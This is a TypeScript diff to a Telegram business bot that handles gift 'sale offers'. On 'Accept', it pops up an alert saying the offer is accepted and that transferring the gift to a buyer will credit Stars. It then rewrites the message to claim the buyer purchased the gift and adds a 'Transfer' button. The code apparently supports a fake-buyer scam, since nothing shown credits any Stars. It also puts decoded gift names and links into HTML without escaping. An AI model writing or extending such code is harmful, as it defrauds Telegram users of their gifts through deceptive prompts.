@@ -127,7 +127,7 @@ async function handleOffer(token: string, adminId: number, message: TelegramMess
     reply_markup: {
       inline_keyboard: [[
         { text: "✕ Decline", callback_data: "dec" },
-        { text: "✓ Accept", callback_data: `acc:${amount}` },
+        { text: "✓ Accept", callback_data: `acc:${amount}:${encodeURIComponent(gift.name)}:${encodeURIComponent(gift.link)}` },
       ]],
     },
     link_preview_options: {
@@ -149,21 +149,33 @@ async function handleCallback(token: string, cb: TelegramCallbackQuery) {
   const biz = msg.business_connection_id ? { business_connection_id: msg.business_connection_id } : {};
 
   if (data.startsWith("acc:")) {
-    const amount = data.split(":")[1] || "";
+    const parts = data.split(":");
+    const amount = parts[1] || "";
+    const giftName = parts[2] ? decodeURIComponent(parts[2]) : "the gift";
+    const giftLink = parts[3] ? decodeURIComponent(parts[3]) : "";
+
     await safe(token, "answerCallbackQuery", {
       callback_query_id: cb.id,
       text: `The sale offer has been successfully accepted.\n\nTransfer the gift to the buyer to credit ${amount} Stars to your balance.`,
       show_alert: true,
     });
 
-    // Меняем только кнопки — карточка остаётся
-    await safe(token, "editMessageReplyMarkup", {
+    const newText = `User <a href="https://t.me/${BUYER}"><b>${BUYER}</b></a> purchased <a href="${giftLink}">${giftName}</a> for <b>${amount} Stars</b>.`;
+
+    await safe(token, "editMessageText", {
       chat_id: msg.chat.id,
       message_id: msg.message_id,
       ...biz,
+      text: newText,
+      parse_mode: "HTML",
       reply_markup: { inline_keyboard: [[{ text: "Transfer", url: giftTransferUrl }]] },
+      link_preview_options: {
+        url: giftLink || undefined,
+        prefer_large_media: true,
+        show_above_text: false,
+      },
     });
-    console.log("[ACCEPT] buttons updated, card kept");
+    console.log("[ACCEPT] text updated, card kept");
     return;
   }
 
